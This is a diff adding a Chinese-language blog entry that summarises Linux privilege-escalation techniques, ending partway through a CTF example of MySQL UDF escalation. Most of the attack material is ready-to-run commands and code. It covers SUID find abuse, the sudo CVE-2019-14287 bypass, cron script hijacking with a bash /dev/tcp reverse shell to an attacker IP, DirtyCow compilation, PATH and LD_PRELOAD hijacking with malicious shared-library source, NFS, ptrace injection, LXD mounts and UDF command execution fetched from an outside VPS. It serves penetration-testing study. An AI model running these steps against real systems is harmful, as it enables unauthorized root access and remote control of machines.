@@ -5450,4 +5450,302 @@ flag为这些答案总和的md5（以<a href="https://cyberchef.org/%E7%BD%91%E7
         <tag>技术杂项</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Linux 提权小结</title>
+    <url>/2026/07/26/Linux%20%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="Linux-权限说明"><a href="#Linux-权限说明" class="headerlink" title="Linux 权限说明"></a>Linux 权限说明</h2><h3 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h3><ul>
+<li><strong>root（UID 0）</strong> ：超级用户，拥有系统最高权限，绕过绝大多数权限检查。</li>
+<li><strong>系统用户（UID 1–999）</strong> ：为服务进程创建的伪用户，如 <code>www-data</code>、<code>mysql</code>、<code>nobody</code>。</li>
+<li><strong>普通用户（UID ≥ 1000）</strong> ：日常登录用户，权限受 UGO 模型约束。</li>
+</ul>
+<p>每个用户可属于一个主组和若干附加组。<code>id</code> 命令可查看当前用户的 UID、GID 及附加组信息：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">id</span><br>uid=1000(kali) gid=1000(kali) <span class="hljs-built_in">groups</span>=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(<span class="hljs-built_in">sudo</span>),29(audio),30(dip),44(video),46(plugdev),100(<span class="hljs-built_in">users</span>),101(netdev),103(scanner),107(bluetooth),120(lpadmin),129(wireshark),130(kaboxer)<br></code></pre></td></tr></table></figure>
+
+<h3 id="文件基础权限"><a href="#文件基础权限" class="headerlink" title="文件基础权限"></a>文件基础权限</h3><p>每个文件有三组权限位，分别对应属主（owner）、属组（group）、其他用户（other）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -l /etc/passwd<br>-rw-r--r-- 1 root root 3253 Dec  2  2025 /etc/passwd<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>位置</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>第 1 位</td>
+<td>文件类型（<code>-</code>普通文件，<code>d</code>目录，<code>l</code>符号链接）</td>
+</tr>
+<tr>
+<td>第 2-4 位</td>
+<td>属主权限（rwx）</td>
+</tr>
+<tr>
+<td>第 5-7 位</td>
+<td>属组权限（rwx）</td>
+</tr>
+<tr>
+<td>第 8-10 位</td>
+<td>其他用户权限（rwx）</td>
+</tr>
+</tbody></table>
+<ul>
+<li><code>r</code>：读权限。对文件表示可读取内容，对目录表示可列出其中的文件名。</li>
+<li><code>w</code>：写权限。对文件表示可修改内容，对目录表示可增删其中的文件。</li>
+<li><code>x</code>：执行权限。对文件表示可执行，对目录表示可进入（<code>cd</code>）。</li>
+</ul>
+<p>权限也可用八进制表示，例如 <code>rwxr-xr-x</code> = <code>755</code>，<code>rw-r--r--</code> = <code>644</code>。</p>
+<h3 id="特殊权限位"><a href="#特殊权限位" class="headerlink" title="特殊权限位"></a>特殊权限位</h3><p>除 rwx 外，Linux 还有三种特殊权限位：</p>
+<table>
+<thead>
+<tr>
+<th>特殊位</th>
+<th>作用对象</th>
+<th>字符标识</th>
+<th>八进制</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>SUID</strong></td>
+<td>可执行文件</td>
+<td><code>s</code>在属主 x 位</td>
+<td>4000</td>
+<td>执行时以文件属主身份运行</td>
+</tr>
+<tr>
+<td><strong>SGID</strong></td>
+<td>可执行文件&#x2F;目录</td>
+<td><code>s</code>在属组 x 位</td>
+<td>2000</td>
+<td>执行时以属组身份运行；对目录则使新文件继承目录属组</td>
+</tr>
+<tr>
+<td><strong>SBIT</strong></td>
+<td>目录</td>
+<td><code>t</code>在其他用户 x 位</td>
+<td>1000</td>
+<td>目录内文件仅文件属主和 root 可删除（如<code>/tmp</code>）</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -l /usr/bin/passwd<br>-rwsr-xr-x 1 root root 114072 Sep 16  2025 /usr/bin/passwd<br></code></pre></td></tr></table></figure>
+
+<p><code>passwd</code> 属主为 root，且属主权限位为 <code>rws</code>，即设置了 SUID。这意味着任何用户执行 <code>passwd</code> 时，进程的有效 UID（EUID）会被设为 root，从而能写入 <code>/etc/shadow</code>。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -ld /tmp<br>drwxrwxrwt 14 root root 340 Jul 19 07:21 /tmp<br></code></pre></td></tr></table></figure>
+
+<p><code>/tmp</code> 的其他用户权限位为 <code>rwt</code>，即设置了 SBIT，保证用户只能删除自己创建的临时文件。</p>
+<h2 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h2><h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p>SUID 提权的核心是：<strong>当一个设置了 SUID 位的二进制文件的属主是 root 时，普通用户执行它所得到的进程 EUID 为 root</strong>。如果该二进制本身存在可被利用的功能（如可执行外部命令、可读写任意文件），就能借此获得 root 权限。</p>
+<h3 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h3><p>MSF 拿到一个 web 权限的 shell，先用 python 起一个终端方便后续操作</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>首先查找拥有 SUID 权限的文件，命令如下（三选一即可，一般用第一个）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure>
+
+<p>查到 find 命令有 SUID 权限，经典的 find 提权，如果有不常见的可以到 <a href="https://gtfobins.org/">GTFOBins</a> 查找</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure>
+
+<h2 id="SUDO-提权"><a href="#SUDO-提权" class="headerlink" title="SUDO 提权"></a>SUDO 提权</h2><h3 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h3><p><code>sudo</code> 允许管理员在 <code>/etc/sudoers</code> 中授权某些用户以特定身份执行特定命令。sudo 需要有一个<strong>普通用户权限的 shell</strong>，因为 web 用户的权限通常较低（如 www-data 用户），且可能缺乏交互式终端或环境完整性。</p>
+<h3 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h3><p>首先拿到一个普通用户权限的 shell，<code>sudo -l</code> 命令查看当前用户可用的 sudo 权限</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> -l<br>(ALL, !root) NOPASSWD: /usr/bin/sqlite3<br></code></pre></td></tr></table></figure>
+
+<p>sudo 提权命令还是到 <a href="https://gtfobins.org/">GTFOBins</a> 查找，<code>sqlite3 /dev/null &#39;.shell /bin/sh&#39;</code></p>
+<p>因为禁止以 root 身份执行 <code>/usr/bin/sqlite3</code>，所以需要再配合 <code>CVE-2019-14287</code> 漏洞来提权，使用 <code>sudo -u#-1</code> 指定 root 用户</p>
+<blockquote>
+<p><strong>CVE-2019-14287</strong>：当 sudoers 中出现 <code>RunAs ALL</code> 且用户名以 <code>#</code> 开头时，<code>sudo -u &quot;#-1&quot;</code> 会以 UID 0（root）执行，绕过 root 限制。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -u#-1 sqlite3 /dev/null <span class="hljs-string">&#x27;.shell /bin/sh&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Cron-提权"><a href="#Cron-提权" class="headerlink" title="Cron 提权"></a>Cron 提权</h2><h3 id="提权原理-2"><a href="#提权原理-2" class="headerlink" title="提权原理"></a>提权原理</h3><p><code>cron</code> 是 Linux 的定时任务服务。系统级 cron 任务定义在 <code>/etc/crontab</code>、<code>/etc/cron.d/*</code>、<code>/etc/cron.&#123;hourly,daily,weekly,monthly&#125;/</code> 中，常以 root 身份执行。若任务脚本存在以下问题，即可被利用：</p>
+<ul>
+<li>以 root 身份执行的脚本对低权限用户可写</li>
+<li>脚本中使用通配符展开（如 <code>tar *</code>）</li>
+<li>脚本调用的程序路径可被覆盖</li>
+</ul>
+<h3 id="提权步骤-2"><a href="#提权步骤-2" class="headerlink" title="提权步骤"></a>提权步骤</h3><p>首先反弹 shell 拿到一个 web 用户权限，查看 cron 任务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">ls</span> -la /etc/cron.d/<br><span class="hljs-built_in">ls</span> -la /etc/cron.&#123;hourly,daily,weekly,monthly&#125;/ 2&gt;/dev/null<br>crontab -l<br>systemctl status cron<br></code></pre></td></tr></table></figure>
+
+<p>发现有一个以 root 权限执行的命令，每隔五分钟执行一次</p>
+<p><img src="https://img3.tofaka.com/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260726/folder-ms1t4fv3-fkzl5ccm/assets/network-asset-1742536835988-31e2f914-8714-438f-87d2-a1416131e91a-20250323120321-1s7dn4w.png"></p>
+<p>修改该文件，将反弹 shell 命令写入该文件，攻击机开启监听，等待定时任务执行，即可拿到 root 权限的 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.52.128/5566 0&gt;&amp;1&quot;</span> &gt;&gt;/etc/script/CleaningScript.sh<br></code></pre></td></tr></table></figure>
+
+<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><h3 id="提权原理-3"><a href="#提权原理-3" class="headerlink" title="提权原理"></a>提权原理</h3><p>内核提权通过利用 Linux 内核自身漏洞直接将当前进程的凭证结构（<code>struct cred</code>）改写为 root。这类利用<strong>不依赖用户态配置</strong>，威力最大、影响最广，但需要内核版本匹配且通常需要编译 Exploit。</p>
+<h3 id="提权步骤-3"><a href="#提权步骤-3" class="headerlink" title="提权步骤"></a>提权步骤</h3><p>首先需要拿到一个 shell，然后信息收集，获取 Linux 版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">hostnamectl<br>uname -a<br>cat /proc/version<br>cat /etc/os-release<br>dmesg | grep &quot;Linux version&quot;<br></code></pre></td></tr></table></figure>
+
+<p>内核提权检测脚本如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">https://github.com/The-Z-Labs/linux-exploit-suggester<br></code></pre></td></tr></table></figure>
+
+<p>将脚本上传到靶机，给一个执行权限，然后直接使用该脚本检测一下有哪些提权漏洞存在</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">upload /root/Desktop/linux-exploit-suggester/linux-exploit-suggester.sh /tmp/PrivEsca.sh<br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-built_in">chmod</span> +x /tmp/PrivEsca.sh<br>/tmp/PrivEsca.sh<br></code></pre></td></tr></table></figure>
+
+<p>运行脚本后版本是黄色就代表在版本区间，即代表该提权漏洞存在</p>
+<p><img src="https://img3.tofaka.com/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260726/folder-ms1t4fv3-fkzl5ccm/assets/network-asset-1742474728608-cd20fb85-52af-44dc-a208-942aa7170c6e-20250323120229-pu6kmks.png"></p>
+<p>然后访问给出的漏洞下载地址下载 EXP，将 EXP 上传编译执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">upload /root/Desktop/linux-exploit-suggester/dcow.cpp /tmp/dcow.cpp<br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil<br><span class="hljs-built_in">chmod</span> +x dcow<br>./dcow<br></code></pre></td></tr></table></figure>
+
+<p>执行成功后 root 密码被强制修改为 dirtyCowFun，直接切换 root 用户即可</p>
+<h3 id="经典内核漏洞"><a href="#经典内核漏洞" class="headerlink" title="经典内核漏洞"></a>经典内核漏洞</h3><p><strong>CVE-2016-5195</strong>  <strong>-</strong>  <strong>DirtyCow</strong></p>
+<p>影响 Linux 内核 2.6.22 至 4.8.3，几乎覆盖 2007–2016 年间所有发行版。利用竞态条件使只读内存映射可写，可覆盖 <code>/etc/passwd</code> 或映射 suid 程序代码段注入 shellcode。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc dirtycow.c -o dirtycow -lpthread -lcrypt<br>./dirtycow<br></code></pre></td></tr></table></figure>
+
+<p><strong>CVE-2026-31431 - Copy Fail</strong></p>
+<p>内核加密子系统的 <code>algif_aead</code> 用户态接口（<code>crypto/algif_aead.c</code>），在处理 <code>recvmsg</code> 拷贝失败时未正确回滚状态，导致内核内存破坏。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python3 copy_fail_exp.py<br></code></pre></td></tr></table></figure>
+
+<h2 id="其他提权方式"><a href="#其他提权方式" class="headerlink" title="其他提权方式"></a>其他提权方式</h2><h3 id="PATH-提权"><a href="#PATH-提权" class="headerlink" title="PATH 提权"></a>PATH 提权</h3><p><strong>提权原理</strong></p>
+<p>若某个 SUID &#x2F; sudo &#x2F; cron 程序调用了未写绝对路径的命令，攻击者可通过修改 <code>PATH</code> 环境变量让程序优先执行攻击者自定义的恶意版本。</p>
+<p><strong>提权步骤</strong></p>
+<p>查找具有 suid 权限的文件，发现一个用户自定义的文件 <code>/opt/statuscheck</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p>IDA 中查看或者直接 string 命令找字符串发现该文件调用了 curl 命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">strings /opt/statuscheck<br></code></pre></td></tr></table></figure>
+
+<p>在 tmp 目录下创建 curl 文件，并把它加入到环境变量中，调用的时候就会首先调用环境变量中的 curl（即我们自定义的 curl），然后执行即可获得 root 权限的 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span>&gt; /tmp/curl<br><span class="hljs-built_in">chmod</span> +x /tmp/curl<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span> <br>/opt/statuscheck<br></code></pre></td></tr></table></figure>
+
+<h3 id="NFS-提权"><a href="#NFS-提权" class="headerlink" title="NFS 提权"></a>NFS 提权</h3><p><strong>提权原理</strong></p>
+<p>当 <code>/etc/exports</code> 中以 <code>no_root_squash</code> 挂载目录时，NFS 客户端的 root 用户在共享目录中仍以 root 身份写文件。</p>
+<p><strong>提权步骤</strong></p>
+<p>首先在 kali 中查看一下靶机的 NFS 目录路径</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">showmount -e 192.168.52.144<br><span class="hljs-built_in">mkdir</span> /tmp/mnt<br>mount -t nfs 192.168.52.144:/mnt/nfs /tmp/mnt<br><span class="hljs-built_in">cd</span> /tmp/mnt<br></code></pre></td></tr></table></figure>
+
+<p>使用 kali 在共享目录放置带 SUID 的 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash /tmp/mnt/rootshell<br><span class="hljs-built_in">chmod</span> u+s /tmp/mnt/rootshell<br><span class="hljs-built_in">chown</span> root:root /tmp/mnt/rootshell<br></code></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行该 suid 权限的文件即可成功提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/tmp/share/rootshell<br></code></pre></td></tr></table></figure>
+
+<h3 id="Capability-提权"><a href="#Capability-提权" class="headerlink" title="Capability 提权"></a>Capability 提权</h3><p><strong>提权原理</strong></p>
+<p>Linux capabilities 将 root 权限拆分为若干细粒度能力（如 <code>cap_setuid</code>、<code>cap_dac_read_search</code>）。若程序被赋予了危险 capability，可被用于提权。</p>
+<p><strong>提权步骤</strong></p>
+<p>查找带 capability 的可执行文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">getcap</span> -r / 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p>常见危险 capability：</p>
+<table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>危害</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cap_setuid</code></td>
+<td>任意切换 UID，直接提权 root</td>
+</tr>
+<tr>
+<td><code>cap_dac_read_search</code></td>
+<td>绕过文件读权限检查</td>
+</tr>
+<tr>
+<td><code>cap_dac_override</code></td>
+<td>绕过文件读写权限检查</td>
+</tr>
+<tr>
+<td><code>cap_setfcap</code></td>
+<td>给任意文件赋予 capability</td>
+</tr>
+<tr>
+<td><code>cap_sys_admin</code></td>
+<td>接近 root 的通用能力（mount、namespace 等）</td>
+</tr>
+<tr>
+<td><code>cap_sys_ptrace</code></td>
+<td>注入其他进程</td>
+</tr>
+</tbody></table>
+<p>这里是 <code>cap_sys_ptrace</code>，需要通过进程注入来提权，需要用到 <code>inject.py</code> 脚本，批处理把所有进程都注入一下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `ps -ef|grep root|grep -v <span class="hljs-string">&quot;grep&quot;</span>|awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>`; <span class="hljs-keyword">do</span> python2.7 inject.py <span class="hljs-variable">$i</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<p>等进程注入完之后，nc 连接 5600 端口，连接成功，成功提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nc 192.168.52.144 5600<br></code></pre></td></tr></table></figure>
+
+<h3 id="LD-PRELOAD-提权"><a href="#LD-PRELOAD-提权" class="headerlink" title="LD_PRELOAD 提权"></a>LD_PRELOAD 提权</h3><p><strong>提权原理</strong></p>
+<p>LD_PRELOAD 是 Linux 系统的环境变量，允许用户指定在程序运行前优先加载的动态链接库（.so 文件）。动态链接器在加载程序时，会优先加载 LD_PRELOAD 指定的库，覆盖程序原本依赖的库函数。通过劫持目标程序调用的关键函数（如 getuid、strcmp 等），攻击者可注入恶意代码实现提权。</p>
+<p><strong>提权步骤</strong></p>
+<p>使用 sudo -l 命令查看 sudo 无密码可执行的文件，明显 1.sh 无法通过 sudo 来提权，因为 sudo 只能用特定的文件提权，但是一旦设置了 LDPRELOAD，那么只要有可执行文件即可提权。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">test</span> ALL=(ALL:ALL) NOPASSWD: /tmp/1.sh<br></code></pre></td></tr></table></figure>
+
+<p>首先编写恶意动态库，C 代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> _init() &#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    setgid(<span class="hljs-number">0</span>);<br>    setuid(<span class="hljs-number">0</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译 C 代码为恶意动态库，然后让程序执行前先加载恶意动态库即可完成提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc -fPIC -shared -o shell.so shell.c -nostartfiles <span class="hljs-built_in">ls</span> -al shell.so<br><span class="hljs-built_in">sudo</span> LD_PRELOAD=/tmp/shell.so /tmp/1.sh<br></code></pre></td></tr></table></figure>
+
+<h3 id="LXD-容器提权"><a href="#LXD-容器提权" class="headerlink" title="LXD 容器提权"></a>LXD 容器提权</h3><p><strong>提权原理</strong></p>
+<p>LXD（Linux Container Daemon）是一种基于 LXC 的系统容器管理器，通过 REST API 提供容器管理能力。其提权漏洞的核心在于特权容器（Privileged Container）的配置缺陷：</p>
+<ul>
+<li><strong>特权容器特性：</strong> 当容器以 security.privileged=true 启动时，容器内的 root 用户直接映射到宿主机的 root 用户，绕过了 Linux 用户命名空间的隔离机制</li>
+<li><strong>文件系统挂载：</strong> 通过 <code>lxc config device add</code> 命令将宿主机根目录（&#x2F;）挂载到容器内（如 <code>/mnt/root</code>），容器内可直接读写宿主机的文件系统，实现权限逃逸</li>
+</ul>
+<p><strong>提权步骤</strong></p>
+<p>准备特权容器镜像，靶机下载预构建的 Alpine 镜像</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python -m http.server 6666  <span class="hljs-comment"># 本地启动HTTP服务</span><br>wget ip:6666/alpine-v3.13-x86_64-20210218_0139.tar.gz  <span class="hljs-comment"># 目标主机下载</span><br></code></pre></td></tr></table></figure>
+
+<p>创建并配置特权容器</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="hljs-built_in">alias</span> myimage    <span class="hljs-comment"># 导入镜像</span><br>lxc init myimage <span class="hljs-built_in">test</span> -c security.privileged=<span class="hljs-literal">true</span>    <span class="hljs-comment"># 创建特权容器（容器名 test，基于镜像 myimage）</span><br>lxc config device add <span class="hljs-built_in">test</span> shellroot disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span>    <span class="hljs-comment"># 挂载宿主机根目录（设备名 shellroot）</span><br>lxc start <span class="hljs-built_in">test</span>    <span class="hljs-comment"># 启动容器</span><br>lxc <span class="hljs-built_in">exec</span> <span class="hljs-built_in">test</span> /bin/sh    <span class="hljs-comment"># 进入容器Shell</span><br></code></pre></td></tr></table></figure>
+
+<p>访问宿主机文件系统，这里的 <code>/mnt/root/</code> 就是靶机的根目录，可以查看任意文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /mnt/root/root<br><span class="hljs-built_in">cat</span> flag.txt<br></code></pre></td></tr></table></figure>
+
+<h2 id="UDF提权简介"><a href="#UDF提权简介" class="headerlink" title="UDF提权简介"></a>UDF提权简介</h2><h3 id="提权原理-4"><a href="#提权原理-4" class="headerlink" title="提权原理"></a>提权原理</h3><p>UDF（User Defined Function，用户自定义函数）是 MySQL &#x2F; MariaDB 提供的扩展机制，允许用户用 C&#x2F;C++ 编写自定义函数，编译为共享库（<code>.so</code>）后加载到数据库中作为 SQL 函数调用。若 MySQL 以 root 身份运行，且攻击者拥有 MySQL 高权限账户（或通过 SQL 注入获得写权限），即可上传恶意 <code>.so</code>，注册一个调用 <code>system()</code> 的 UDF，从而以 root 身份执行任意系统命令。利用条件如下：</p>
+<ul>
+<li>MySQL 服务以 root 或较高权限用户运行</li>
+<li><code>secure_file_priv</code> 未限制导出路径，或限制路径可写（MySQL 5.7+ 默认 <code>/var/lib/mysql-files/</code>）</li>
+<li>知道 MySQL 插件目录路径（<code>@@plugin_dir</code>）</li>
+</ul>
+<h3 id="提权步骤-4"><a href="#提权步骤-4" class="headerlink" title="提权步骤"></a>提权步骤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain"># 查看版本、权限和plugin位置等基础信息<br>select version();<br>show variables like &#x27;version_compile_%&#x27;;&quot;<br>show global variables like &#x27;%secure_file_priv%&#x27;;<br>show variables like &#x27;%secure%&#x27;;&quot;<br>select user();<br>select * from mysql.user where user = substring_index(user(), &#x27;@&#x27;, 1)\G;<br>show variables like &#x27;%plugin%&#x27;;<br><br>#下载并编译kali上自带的searchsploit搜索得到的udf.c<br>wget http://156.238.233.78:7777/udf.c<br>gcc -g -c udf.c -fPIC<br>gcc -g -shared -Wl,-soname,udf.so -o udf.so udf.o -lc<br><br>#创建自定义函数do_system，函数由udf.so实现，可执行任意命令<br>select load_file(&#x27;/tmp/udf.so&#x27;) into dumpfile &#x27;//usr/lib/mysql/plugin/udf.so&#x27;;<br>create function do_system returns integer soname &#x27;udf.so&#x27;;<br>select * from mysql.func;<br>select do_system(&#x27;chmod 777 /flag&#x27;);<br>select do_system(&#x27;tac /flag&#x27;);<br></code></pre></td></tr></table></figure>
+
+<h3 id="例题详解"><a href="#例题详解" class="headerlink" title="例题详解"></a>例题详解</h3><blockquote>
+<p><strong>例题：2024年春秋杯网络安全联赛夏季赛-brother</strong></p>
+</blockquote>
+<p>前面是一个无 waf 的 SSTI，fenjing 一把梭了，执行反弹 shell 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.78/2233 0&gt;&amp;1&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>没有权限无法直接拿到 flag，当前目录下有执行 sql 查询脚本，并且给出了数据库账号密码，可以尝试 udf 提权</p>
+<p><img src="https://img3.tofaka.com/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260726/folder-ms1t4fv3-fkzl5ccm/assets/network-asset-1736689553951-39abf991-455d-4039-9f33-cede912b4003-20250113091600-r9wazg6.png"></p>
+<p>使用如下命令可以无交互的执行 sql 语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;&quot;;<br></code></pre></td></tr></table></figure>
+
+<p><strong>查看利用条件</strong></p>
+<p>首先查看数据库的版本和系统信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -Dmysql -e &quot;select version();&quot;;<br>mysql -uctf -p123456 -e &quot;show variables like &#x27;version_compile_%&#x27;;&quot;;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img3.tofaka.com/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260726/folder-ms1t4fv3-fkzl5ccm/assets/network-asset-1736689824468-4fc19464-87b2-4b75-96ae-c048a7dd99f7-20250113091600-yk1j9qc.png"></p>
+<p>核验 <code>secure_file_priv</code> 是否为空，也就是查看是否允许导入导出文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;show global variables like &#x27;%secure_file_priv%&#x27;;&quot;;<br>mysql -uctf -p123456 -e &quot;show variables like &#x27;%secure%&#x27;;&quot;<br></code></pre></td></tr></table></figure>
+
+<p>使用如下命令查看插件的位置，得到 plugin 目录 <code>/usr/lib/mysql/plugin/</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;show variables like &#x27;%plugin%&#x27;;&quot;;<br></code></pre></td></tr></table></figure>
+
+<p><strong>下载编译 UDF 文件</strong></p>
+<p>使用 kali 得到 UDF 文件，UDF 提权需要有个可以执行系统命令的 UDF 文件，我们使用 searchsploit 获得 UDF 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">searchsploit mysql udf<br>searchsploit mysql udf -m 1518<br>mv 1518.c udf.c<br></code></pre></td></tr></table></figure>
+
+<p>先将 <code>udf.c</code> 上传到自己的 VPS 上，再使用 wget 命令下载，下载好后需要编译 <code>udf.c</code> 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">cd /tmp<br>wget http://156.238.233.78:7777/udf.c<br>gcc -g -c udf.c -fPIC<br>gcc -g -shared -Wl,-soname,udf.so -o udf.so udf.o -lc<br></code></pre></td></tr></table></figure>
+
+<p><strong>创建自定义函数</strong></p>
+<p>编译完成后将 tmp 目录下的 <code>udf.so</code> 文件移动到 plugin 文件夹下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;select load_file(&#x27;/tmp/udf.so&#x27;) into dumpfile &#x27;//usr/lib/mysql/plugin/udf.so&#x27;;&quot;;<br></code></pre></td></tr></table></figure>
+
+<p>创建自定义函数 <code>do_system</code>，该函数的实现由我们上传的恶意提权文件 <code>udf.so</code> 提供</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;create function do_system returns integer soname &#x27;udf.so&#x27;;&quot;;<br></code></pre></td></tr></table></figure>
+
+<p>创建完成后判断是否创建成功，如果有回显就代表成功了</p>
